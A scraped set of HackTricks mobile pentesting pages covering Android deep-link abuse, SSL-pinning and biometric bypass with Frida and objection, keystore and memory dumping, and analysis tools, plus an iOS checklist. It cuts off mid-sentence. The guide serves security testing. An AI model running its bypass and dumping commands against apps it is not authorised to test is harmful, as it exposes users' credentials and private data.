Drozer.\n‚Äã\nExploiting Schemes / Deep links\nYou can look for deep links manually, using tools like MobSF or scripts like\nthis one\n.\nYou can\nopen\na declared\nscheme\nusing\nadb\nor a\nbrowser\n:\nadb shell am start\n-a\nandroid.intent.action.VIEW\n-d\n\"scheme://hostname/path?param=value\"\n[\nyour.package.name\n]\nNote that you can\nomit the package name\nand the mobile will automatically call the app that should open that link.\n<!-- Browser regular link -->\n<\na\nhref\n=\n\"\nscheme://hostname/path?param=value\n\"\n>\nClick me\n</\na\n>\n<!-- fallback in your url you could try the intent url -->\n<\na\nhref\n=\n\"\nintent://hostname#Intent;scheme=scheme;package=your.package.name;S.browser_fallback_url=http%3A%2F%2Fwww.example.com;end\n\"\n>\nwith alternative\n</\na\n>\nCode executed\nIn order to find the\ncode that will be executed in the App\n, go to the activity called by the deeplink and search the function\nonNewIntent\n.\nSensitive info\nEvery time you find a deep link check that i\nt's not receiving sensitive data (like passwords) via URL parameters\n, because any other application could\nimpersonate the deep link and steal that data!\nParameters in path\nYou\nmust check also if any deep link is using a parameter inside the path\nof the URL like:\nhttps://api.example.com/v1/users/{username}\n, in that case you can force a path traversal accessing something like:\nexample://app/users?username=../../unwanted-endpoint%3fparam=value\n.\nNote that if you find the correct endpoints inside the application you may be able to cause a\nOpen Redirect\n(if part of the path is used as domain name),\naccount takeover\n(if you can modify users details without CSRF token and the vuln endpoint used the correct method) and any other vuln. More\ninfo about this here\n.\nMore examples\nAn\ninteresting bug bounty report\nabout links (\n/.well-known/assetlinks.json\n).\nInsufficient Transport Layer Protection\nLack of Certificate Inspection:\nAndroid Application fails to verify the identity of the certificate presented to it. Most of the application ignore the warnings and accept any self-signed certificate presented. Some Application instead pass the traffic through an HTTP connection.\nWeak Handshake Negotiation:\nApplication and server perform an SSL/TLS handshake but use an insecure cipher suite which is vulnerable to MITM attacks. So any attacker can easily decrypt that connection.\nPrivacy Information Leakage:\nMost of the times it happens that Applications do authentication through a secure channel but rest all connection through non-secure channel. That doesn‚Äôt add to security of application because rest sensitive data like session cookie or user data can be intercepted by an malicious user.\nFrom the 3 scenarios presented we are going to discuss\nhow to verify the identity of the certificate\n. The other 2 scenarios depends on the\nTLS configuratio\nn of the server and if the\napplication sends unencrypted data\n. The pentester should check by it's own the TLS configuration of the server (\nhere\n) and detect if any\nconfidential information is sent by an unencrypted/vulnerable\nchannel .\nMore information about how to discover and fix these kind of vulnerabilities\nhere\n.\nSSL Pinning\nBy default, when making an SSL connection, the client(android app) checks that the server‚Äôs certificate has a verifiable chain of trust back to a trusted (root) certificate and matches the requested hostname. This lead to problem of\nMan in the Middle Attacks(MITM)\n.\nIn certificate Pinnning, an Android Application itself contains the certificate of server and only transmit data if the same certificate is presented.\nIt's recommended to\napply SSL Pinning\nfor the sites where sensitive information is going to be sent.\nInspecting HTTP traffic\nFirst of all, you should (must)\ninstall the certificate\nof the\nproxy\ntool that you are going to use, probably Burp. If you don't install the CA certificate of the proxy tool, you probably aren't going to see the encrypted traffic in the proxy.\nPlease,\nread this guide to learn how to do install a custom CA certificate\n.\nFor applications targeting\nAPI Level 24+ it isn't enough to install the Burp CA\ncertificate in the device. To bypass this new protection you need to modify the Network Security Config file. So, you could modify this file to authorise your CA certificate or you can\nread this page for a tutorial on how to force the application to accept again all the installed certificate sin the device\n.\nSSL Pinning\nWe have already discuss what is SSL Pinning just 2 paragraphs before. When it's implemented in an application you will need to bypass it to inspect the HTTPS traffic or you won't see it.\nHere I'm going to present a few options I've used to bypass this protection:\nAutomatically\nmodify\nthe\napk\nto\nbypass\nSSLPinning with\napk-mitm\n. The best pro of this option, is that you won't need root to bypass the SSL Pinning, but you will need to delete the application and reinstall the new one, and this won't always work.\nYou could use\nFrida\n(discussed below) to bypass this protection. Here you have a guide to use Burp+Frida+Genymotion:\nhttps://spenkk.github.io/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/\n‚Äã\nYou can also try to\nautomatically bypass SSL Pinning\nusing\nobjection\n:\nobjection --gadget com.package.app explore --startup-command \"android sslpinning disable\"\nYou can also try to\nautomatically bypass SSL Pinning\nusing\nMobSF dynamic analysis\n(explained below)\nIf you still think that there is some traffic that you aren't capturing you can try to\nforward the traffic to burp using iptables\n. Read this blog:\nhttps://infosecwriteups.com/bypass-ssl-pinning-with-ip-forwarding-iptables-568171b52b62\n‚Äã\nCommon Web vulnerabilities\nNote that in this step you should look for common web vulnerabilities. A lot of information about web vulnerabilities be found in this book so I'm not going to mention them here.\nFrida\nDynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. Learn more at\nwww.frida.re\n.\nIt's amazing, you can access running application and hook methods on run time to change the behaviour, change values, extract values, run different code...\nIf you want to pentest Android applications you need to know how to use Frida.\nLearn how to use Frida:\nFrida tutorial\nSome \"GUI\" for actions with Frida:\nhttps://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security\nSome other abstractions based on Frida:\nhttps://github.com/sensepost/objection\n,\nhttps://github.com/dpnishant/appmon\nYou can find some Awesome Frida scripts here:\nhttps://codeshare.frida.re/\n‚Äã\nDump Memory - Fridump\nCheck if the application is storing sensitive information inside the memory that it shouldn't be storing like passwords or mnemonics.\nUsing\nFridump3\nyou can dump the memory of the app with:\n# With PID\npython3 fridump3.py\n-u\n<\nPID\n>\n‚Äã\n# With name\nfrida-ps\n-Uai\npython3 fridump3.py\n-u\n\"<Name>\"\nThis will dump the memory in ./dump folder, and in there you could grep with something like:\nstrings *\n|\ngrep\n-E\n\"^[a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+$\"\nSensitive data in Keystore\nIn Android the Keystore is the best place to store sensitive data, however, with enough privileges it's still\npossible to access it\n. As applications tends to store here\nsensitive data in clear text\nthe pentests should check for it as root user or someones with physical access to the device could be able to steal this data.\nEven if an app stored date in the keystore, the data should be encrypted.\nTo access the data inside the keystore you could use this Frida script:\nhttps://github.com/WithSecureLabs/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js\n‚Äã\nfrida\n-U\n-f\ncom.example.app\n-l\nfrida-scripts/tracer-cipher.js\nFingerprint/Biometrics Bypass\nUsing the following Frida script it could be possible to\nbypass fingerprint authentication\nAndroid applications might be performing in order to\nprotect certain sensitive areas:\nfrida\n--codeshare\nkrapgras/android-biometric-bypass-update-android-11\n-U\n-f\n<\napp.package\n>\nBackground Images\nWhen you put an application in background, Android stores a\nsnapshot of the application\nso when it's recovered to foreground it starts loading the image before the app so ot looks like the app was loaded faster.\nHowever, if this snapshot contains\nsensitive information\n, someone with access to the snapshot might\nsteal that info\n(note that you need root to access it).\nThe snapshots are usually stored around:\n/data/system_ce/0/snapshots\nAndroid provides a way to\nprevent the screenshot capture by setting the FLAG_SECURE\nlayout parameter. By using this flag, the window contents are treated as secure, preventing it from appearing in screenshots or from being viewed on non-secure displays.\ngetWindow\n()\n.setFlags\n(\nLayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE\n);\nAndroid Application Analyzer\nThis tool could help you managing different tools during the dynamic analysis:\nhttps://github.com/NotSoSecure/android_application_analyzer\n‚Äã\nIntent Injection\nThis vulnerability resembles\nOpen Redirect in web security\n. Since class\nIntent\nis\nParcelable\n,\nobjects belonging to this class\ncan be\npassed\nas\nextra\ndata\nin another\nIntent\nobject.\nMany developers make\nuse\nof this\nfeature\nand create\nproxy\ncomponents\n(activities, broadcast receivers and services) that\ntake an embedded Intent and pass it to dangerous methods\nlike\nstartActivity(...)\n,\nsendBroadcast(...)\n, etc.\nThis is dangerous because\nan attacker can force the app to launch a non-exported component that cannot be launched directly from another app\n, or to grant the attacker access to its content providers.\nWebView\nalso sometimes changes a\nURL from a string to an\nIntent\nobject, using the\nIntent.parseUri(...)\nmethod, and passes it to\nstartActivity(...)\n.\nAndroid Client Side Injections and others\nProbably you know about this kind of vulnerabilities from the Web. You have to be specially careful with this vulnerabilities in an Android application:\nSQL Injection:\nWhen dealing with dynamic queries or Content-Providers ensure you are using parameterized queries.\nJavaScript Injection (XSS):\nVerify that JavaScript and Plugin support is disabled for any WebViews (disabled by default).\nMore info here\n.\nLocal File Inclusion:\nVerify that File System Access is disabled for any WebViews (enabled by default)\n(webview.getSettings().setAllowFileAccess(false);)\n.\nMore info here\n.\nEternal cookies\n: In several cases when the android application finish the session the cookie isn't revoked or it could be even saved to disk\n‚Äã\nSecure Flag\nin cookies\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nAutomatic Analysis\n‚Äã\nMobSF\n‚Äã\nStatic analysis\nVulnerability assessment of the application\nusing a nice web-based frontend. You can also perform dynamic analysis (but you need to prepare the environment).\ndocker\npull opensecurity/mobile-security-framework-mobsf\ndocker\nrun\n-it\n-p\n8000\n:8000 opensecurity/mobile-security-framework-mobsf:latest\nNotice that MobSF can analyse\nAndroid\n(apk)\n, IOS\n(ipa)\nand Windows\n(apx) applications (\nWindows applications must be analyzed from a MobSF installed in a Windows host\n).\nAlso, if you create a\nZIP\nfile with the source code if an\nAndroid\nor an\nIOS\napp (go to the root folder of the application, select everything and create a ZIPfile), it will be able to analyse it also.\nMobSF also allows you to\ndiff/Compare\nanalysis and to integrate\nVirusTotal\n(you will need to set your API key in\nMobSF/settings.py\nand enable it:\nVT_ENABLED = TRUE\nVT_API_KEY = <Your API key>\nVT_UPLOAD = TRUE\n). You can also set\nVT_UPLOAD\nto\nFalse\n, then the\nhash\nwill be\nupload\ninstead of the file.\nAssisted Dynamic analysis with MobSF\nMobSF\ncan also be very helpful for\ndynamic analysis\nin\nAndroid\n, but in that case you will need to install MobSF and\ngenymotion\nin your host (a VM or Docker won't work).\nNote: You need to\nstart first a VM in genymotion\nand\nthen MobSF.\nThe\nMobSF dynamic analyser\ncan:\nDump application data\n(URLs, logs, clipboard, screenshots made by you, screenshots made by \"\nExported Activity Tester\n\", emails, SQLite databases, XML files, and other created files). All of this is done automatically except for the screenshots, you need to press when you want a screenshot or you need to press \"\nExported Activity Tester\n\" to obtain screenshots of all the exported activities.\nCapture\nHTTPS traffic\nUse\nFrida\nto obtain\nruntime\ninformation\nFrom android\nversions > 5\n, it will\nautomatically start Frida\nand will set global\nproxy\nsettings to\ncapture\ntraffic. It will only capture traffic from the tested application.\nFrida\nBy default, it will also use some Frida Scripts to\nbypass SSL pinning\n,\nroot detection\nand\ndebugger detection\nand to\nmonitor interesting APIs\n.\nMobSF can also\ninvoke exported activities\n, grab\nscreenshots\nof them and\nsave\nthem for the report.\nTo\nstart\nthe dynamic testing press the green bottom: \"\nStart Instrumentation\n\". Press the \"\nFrida Live Logs\n\" to see the logs generated by the Frida scripts and \"\nLive API Monitor\n\" to see all the invocation to hooked methods, arguments passed and returned values (this will appear after pressing \"Start Instrumentation\").\nMobSF also allows you to load your own\nFrida scripts\n(to send the results of your Friday scripts to MobSF use the function\nsend()\n). It also has\nseveral pre-written scripts\nyou can load (you can add more in\nMobSF/DynamicAnalyzer/tools/frida_scripts/others/\n), just\nselect them\n, press \"\nLoad\n\" and press \"\nStart Instrumentation\n\" (you will be able to see the logs of that scripts inside \"\nFrida Live Logs\n\").\nMoreover, you have some Auxiliary Frida functionalities:\nEnumerate Loaded Classes\n: It will print all the loaded classes\nCapture Strings\n: It will print all the capture strings while using the application (super noisy)\nCapture String Comparisons\n: Could be very useful. It will\nshow the 2 strings being compared\nand if the result was True or False.\nEnumerate Class Methods\n: Put the class name (like \"java.io.File\") and it will print all the methods of the class.\nSearch Class Pattern\n: Search classes by pattern\nTrace Class Methods\n:\nTrace\na\nwhole class\n(see inputs and outputs of all methods of th class). Remember that by default MobSF traces several interesting Android Api methods.\nOnce you have selected the auxiliary module you want to use you need to press \"\nStart Intrumentation\n\" and you will see all the outputs in \"\nFrida Live Logs\n\".\nShell\nMobsf also brings you a shell with some\nadb\ncommands,\nMobSF commands\n, and common\nshell\ncommands\nat the bottom of the dynamic analysis page. Some interesting commands:\nhelp\nshell\nls\nactivities\nexported_activities\nservices\nreceivers\nHTTP tools\nWhen http traffic is capture you can see an ugly view of the captured traffic on \"\nHTTP(S) Traffic\n\" bottom or a nicer view in \"\nStart HTTPTools\n\" green bottom. From the second option, you can\nsend\nthe\ncaptured requests\nto\nproxies\nlike Burp or Owasp ZAP.\nTo do so,\npower on Burp -->\nturn off Intercept --> in MobSB HTTPTools select the request\n--> press \"\nSend to Fuzzer\n\" -->\nselect the proxy address\n(\nhttp://127.0.0.1:8080\\\n).\nOnce you finish the dynamic analysis with MobSF you can press on \"\nStart Web API Fuzzer\n\" to\nfuzz http requests\nan look for vulnerabilities.\nAfter performing a dynamic analysis with MobSF the proxy settings me be misconfigured and you won't be able to fix them from the GUI. You can fix the proxy settings by doing:\nadb shell settings put global http_proxy :0\nAssisted Dynamic Analysis with Inspeckage\nYou can get the tool from\nInspeckage\n.\nThis tool with use some\nHooks\nto let you know\nwhat is happening in the application\nwhile you perform a\ndynamic analysis\n.\nInspeckage Tutorial\n‚Äã\nYaazhini\n‚Äã\nThis is a\ngreat tool to perform static analysis with a GUI\n‚Äã\nQark\n‚Äã\nThis tool is designed to look for several\nsecurity related Android application vulnerabilities\n, either in\nsource code\nor\npackaged APKs\n. The tool is also\ncapable of creating a \"Proof-of-Concept\" deployable APK\nand\nADB commands\n, to exploit some of the found vulnerabilities (Exposed activities, intents, tapjacking...). As with Drozer, there is no need to root the test device.\npip3\ninstall\n--user\nqark\n# --user is only needed if not using a virtualenv\nqark\n--apk\npath/to/my.apk\nqark\n--java\npath/to/parent/java/folder\nqark\n--java\npath/to/specific/java/file.java\n‚Äã\nReverseAPK\n‚Äã\nDisplays all extracted files for easy reference\nAutomatically decompile APK files to Java and Smali format\nAnalyze AndroidManifest.xml for common vulnerabilities and behavior\nStatic source code analysis for common vulnerabilities and behavior\nDevice info\nIntents\nCommand execution\nSQLite references\nLogging references\nContent providers\nBroadcast recievers\nService references\nFile references\nCrypto references\nHardcoded secrets\nURL's\nNetwork connections\nSSL references\nWebView references\nreverse-apk relative/path/to/APP.apk\n‚Äã\nSUPER Android Analyzer\n‚Äã\nSUPER is a command-line application that can be used in Windows, MacOS X and Linux, that analyzes\n.apk\nfiles in search for vulnerabilities. It does this by decompressing APKs and applying a series of rules to detect those vulnerabilities.\nAll rules are centered in a\nrules.json\nfile, and each company or tester could create its own rules to analyze what they need.\nDownload the latest binaries from in the\ndownload page\n‚Äã\nsuper-analyzer {apk_file}\n‚Äã\nStaCoAn\n‚Äã\nStaCoAn is a\ncrossplatform\ntool which aids developers, bugbounty hunters and ethical hackers performing\nstatic code analysis\non mobile applications*.\nThe concept is that you drag and drop your mobile application file (an .apk or .ipa file) on the StaCoAn application and it will generate a visual and portable report for you. You can tweak the settings and wordlists to get a customized experience.\nDownload\nlatest release\n:\n./stacoan\n‚Äã\nAndroBugs\n‚Äã\nAndroBugs Framework is an Android vulnerability analysis system that helps developers or hackers find potential security vulnerabilities in Android applications.\nWindows releases\n‚Äã\npython androbugs.py -f [APK file]\nandrobugs.exe -f [APK file]\n‚Äã\nAndrowarn\n‚Äã\nAndrowarn\nis a tool whose main aim is to detect and warn the user about potential malicious behaviours developped by an Android application.\nThe detection is performed with the\nstatic analysis\nof the application's Dalvik bytecode, represented as\nSmali\n, with the\nandroguard\nlibrary.\nThis tool looks for\ncommon behavior of \"bad\" applications\nlike: Telephony identifiers exfiltration, Audio/video flow interception, PIM data modification, Arbitrary code execution...\npython androwarn.py -i my_application_to_be_analyzed.apk -r html -v 3\n‚Äã\nMARA Framework\n‚Äã\nMARA\nis a\nM\nobile\nA\npplication\nR\neverse engineering and\nA\nnalysis Framework. It is a tool that puts together commonly used mobile application reverse engineering and analysis tools, to assist in testing mobile applications against the OWASP mobile security threats. Its objective is to make this task easier and friendlier to mobile application developers and security professionals.\nIt is able to:\nExtract Java and Smali code using different tools\nAnalyze APKs using:\nsmalisca\n,\nClassyShark\n,\nandrobugs\n,\nandrowarn\n,\nAPKiD\n‚Äã\nExtract private information from the APK using regexps.\nAnalyze the Manifest.\nAnalyze found domains using:\npyssltest\n,\ntestssl\nand\nwhatweb\n‚Äã\nDeobfuscate APK via\napk-deguard.com\n‚Äã\nKoodous\nUseful to detect malware:\nhttps://koodous.com/\n‚Äã\nObfuscating/Deobfuscating code\nNote that depending the service and configuration you use to obfuscate the code. Secrets may or may not ended obfuscated.\n‚Äã\nProGuard\n‚Äã\nProGuard\nis an open source command-line tool that shrinks, optimizes and obfuscates Java code. It is able to optimize bytecode as well as detect and remove unused instructions. ProGuard is free software and is distributed under the GNU General Public License, version 2.\nProGuard is distributed as part of the Android SDK and runs when building the application in release mode.\nFrom:\nhttps://en.wikipedia.org/wiki/ProGuard_(software)\n‚Äã\n‚Äã\nDexGuard\n‚Äã\nFind a step-by-step guide to deobfuscate the apk in\nhttps://blog.lexfo.fr/dexguard.html\n‚Äã\n(From that guide) Last time we checked, the Dexguard mode of operation was:\nload a resource as an InputStream;\nfeed the result to a class inheriting from FilterInputStream to decrypt it;\ndo some useless obfuscation to waste a few minutes of time from a reverser;\nfeed the decrypted result to a ZipInputStream to get a DEX file;\nfinally load the resulting DEX as a Resource using the\nloadDex\nmethod.\n‚Äã\nDeGuard\n‚Äã\nDeGuard reverses the process of obfuscation performed by Android obfuscation tools. This enables numerous security analyses, including code inspection and predicting libraries.\nYou can upload an obfuscated APK to their platform.\n‚Äã\nSimplify\n‚Äã\nIt is a\ngeneric android deobfuscator.\nSimplify\nvirtually executes an app\nto understand its behavior and then\ntries to optimize the code\nso it behaves identically but is easier for a human to understand. Each optimization type is simple and generic, so it doesn't matter what the specific type of obfuscation is used.\n‚Äã\nAPKiD\n‚Äã\nAPKiD gives you information about\nhow an APK was made\n. It identifies many\ncompilers\n,\npackers\n,\nobfuscators\n, and other weird stuff. It's\nPEiD\nfor Android.\nManual\n‚Äã\nRead this tutorial to learn some tricks on\nhow to reverse custom obfuscation\n‚Äã\nLabs\n‚Äã\nAndrol4b\n‚Äã\nAndroL4b is an Android security virtual machine based on ubuntu-mate includes the collection of latest framework, tutorials and labs from different security geeks and researchers for reverse engineering and malware analysis.\nOWASP\nhttps://github.com/OWASP/owasp-mstg%0Ahttps://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06g-testing-network-communication\ngithub.com\nGit Repos\n‚Äã\nhttps://github.com/riddhi-shree/nullCommunity/tree/master/Android\nhttps://www.youtube.com/watch?v=PMKnPaGWxtg&feature=youtu.be&ab_channel=B3nacSec\n‚Äã\nReferences\nFor more information visit:\n‚Äã\nhttps://appsecwiki.com/#/\nIt is a great list of resources\n‚Äã\nhttps://maddiestone.github.io/AndroidAppRE/\nAndroid quick course\n‚Äã\nhttps://manifestsecurity.com/android-application-security/\n‚Äã\n‚Äã\nhttps://github.com/Ralireza/Android-Security-Teryaagh\n‚Äã\nTo Test\n‚Äã\nhttps://www.vegabird.com/yaazhini/\n‚Äã\n‚Äã\nhttps://github.com/abhi-r3v0/Adhrit\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMobile Pentesting -\nPrevious\nAndroid APK Checklist\nNext\nAndroid Applications Basics\nLast modified\n1mo ago"
    },
    {
        "title": "iOS Pentesting Checklist",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting-checklist",
        "text": "iOS Pentesting Checklist\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPreparation\nRead\niOS Basics\n‚Äã\nPrepare your environment reading\niOS Testing Environment\n‚Äã\nRead all the sections of\niOS Initial Analysis\nto learn common actions to pentest an iOS application\nData Storage\n‚Äã\nPlist files\ncan be used to store sensitive information.\n‚Äã\nCore Data\n(SQLite database) can store sensitive information.\n‚Äã\nYapDatabases\n(SQLite database) can store sensitive information.\n‚Äã\nFirebase\nmiss-configuration.\n‚Äã\nRealm databases\ncan store sensitive information.\n‚Äã\nCouchbase Lite databases\ncan store sensitive information.\n‚Äã\nBinary cookies\ncan store sensitive information\n‚Äã\nCache data\ncan store sensitive information\n‚Äã\nAutomatic snapshots\ncan save visual sensitive information\n‚Äã\nKeychain\nis usually used to store sensitive information that can be left when reselling the phone.\nIn summary, just\ncheck for sensitive information saved by the application in the filesystem\nKeyboards\nDoes the application\nallow to use custom keyboards\n?\nCheck if sensitive information is saved in the\nkeyboards cache files\n‚Äã\nLogs\nCheck if\nsensitive information is being logged\n‚Äã\nBackups\n‚Äã\nBackups\ncan be used to\naccess the sensitive information\nsaved in the file system (check the initial point of this checklist)\nAlso,\nbackups\ncan be used to\nmodify some configurations of the application\n, then\nrestore\nthe backup on the phone, and the as the\nmodified configuration\nis\nloaded\nsome (security)\nfunctionality\nmay be\nbypassed\nApplications Memory\nCheck for sensitive information inside the\napplication's memory\n‚Äã\nBroken Cryptography\nCheck if yo can find\npasswords used for cryptography\n‚Äã\nCheck for the use of\ndeprecated/weak algorithms\nto send/store sensitive data\n‚Äã\nHook and monitor cryptography functions\n‚Äã\nLocal Authentication\nIf a\nlocal authentication\nis used in the application, you should check how the authentication is working.\nIf it's using the\nLocal Authentication Framework\nit could be easily bypassed\nIf it's using a\nfunction that can dynamically bypassed\nyou could create a custom frida script\nSensitive Functionality Exposure Through IPC\n‚Äã\nCustom URI Handlers / Deeplinks / Custom Schemes\n‚Äã\nCheck if the application is\nregistering any protocol/scheme\nCheck if the application is\nregistering to use\nany protocol/scheme\nCheck if the application\nexpects to receive any kind of sensitive information\nfrom the custom scheme that can be\nintercepted\nby the another application registering the same scheme\nCheck if the application\nisn't checking and sanitizing\nusers input via the custom scheme and some\nvulnerability can be exploited\nCheck if the application\nexposes any sensitive action\nthat can be called from anywhere via the custom scheme\n‚Äã\nUniversal Links\n‚Äã\nCheck if the application is\nregistering any universal protocol/scheme\nCheck the\napple-app-site-association\nfile\nCheck if the application\nisn't checking and sanitizing\nusers input via the custom scheme and some\nvulnerability can be exploited\nCheck if the application\nexposes any sensitive action\nthat can be called from anywhere via the custom scheme\n‚Äã\nUIActivity Sharing\n‚Äã\nCheck if the application can receive UIActivities and if it's possible to exploit any vulnerability with specially crafted activity\n‚Äã\nUIPasteboard\n‚Äã\nCheck if the application if\ncopying anything to the general pasteboard\nCheck if the application if\nusing the data from the general pasteboard for anything\nMonitor the pasteboard to see if any\nsensitive data is copied\n‚Äã\nApp Extensions\n‚Äã\nIs the application\nusing any extension\n?\n‚Äã\nWebViews\n‚Äã\nCheck which kind of webviews are being used\nCheck the status of\njavaScriptEnabled\n,\nJavaScriptCanOpenWindowsAutomatically\n,\nhasOnlySecureContent\nCheck if the webview can\naccess local files\nwith the protocol\nfile://\n(\nallowFileAccessFromFileURLs\n,\nallowUniversalAccessFromFileURLs\n)\nCheck if Javascript can access\nNative\nmethods\n(\nJSContext\n,\npostMessage\n)\nNetwork Communication\nPerform a\nMitM to the communication\nand search for web vulnerabilities.\nCheck if the\nhostname of the certificate\nis checked\nCheck/Bypass\nCertificate Pinning\n‚Äã\nMisc\nCheck for\nautomatic patching/updating\nmechanisms\nCheck for\nmalicious third party libraries\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPrevious\nWebview Attacks\nNext\n- Mobile Pentesting\niOS Pentesting\nLast modified\n2mo ago"
    },
    {
        "title": "iOS Pentesting",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting",
        "text": "iOS Pentesting\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\niOS Basics\niOS Basics\nTesting Environment\nIn this page you can find information about the\niOS simulator\n,\nemulators\nand\njailbreaking:\niOS Testing Environment\nInitial Analysis\nBasic iOS Testing Operations\nDuring the testing\nseveral operations are going to be suggested\n(connect to the device, read/write/upload/download files, use some tools...). Therefore, if you don't know how to perform any of these actions please,\nstart reading the page\n:\niOS Basic Testing Operations\nFor the following steps\nthe app should be installed\nin the device and should have already obtained the\nIPA file\nof the application.\nRead the\nBasic iOS Testing Operations\npage to learn how to do this.\nBasic Static Analysis\nIt's recommended to use the tool\nMobSF\nto perform an automatic Static Analysis to the IPA file.\nIdentification of\nprotections are present in the binary\n:\nPIE (Position Independent Executable)\n: When enabled, the application loads into a random memory address every-time it launches, making it harder to predict its initial memory address.\notool\n-hv\n<\napp-binary\n>\n|\ngrep\nPIE\n# It should include the PIE flag\nStack Canaries\n: To validate the integrity of the stack, a ‚Äòcanary‚Äô value is placed on the stack before calling a function and is validated again once the function ends.\notool\n-I\n-v\n<\napp-binary\n>\n|\ngrep\nstack_chk\n# It should include the symbols: stack_chk_guard and stack_chk_fail\nARC (Automatic Reference Counting)\n: To prevent common memory corruption flaws\notool\n-I\n-v\n<\napp-binary\n>\n|\ngrep\nobjc_release\n# It should include the _objc_release symbol\nEncrypted Binary\n: The binary should be encrypted\notool\n-arch\nall\n-Vl\n<\napp-binary\n>\n|\ngrep\n-A5\nLC_ENCRYPT\n# The cryptid should be 1\nIdentification of Sensitive/Insecure Funcions\nWeak Hashing Algorithms\n# On the iOS device\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_CC_MD5\"\notool\n-Iv\n<\napp\n>\n|\ngrep\n-w\n\"_CC_SHA1\"\n‚Äã\n# On linux\ngrep\n-iER\n\"_CC_MD5\"\ngrep\n-iER\n\"_CC_SHA1\"\nInsecure Random Functions\n# On the iOS 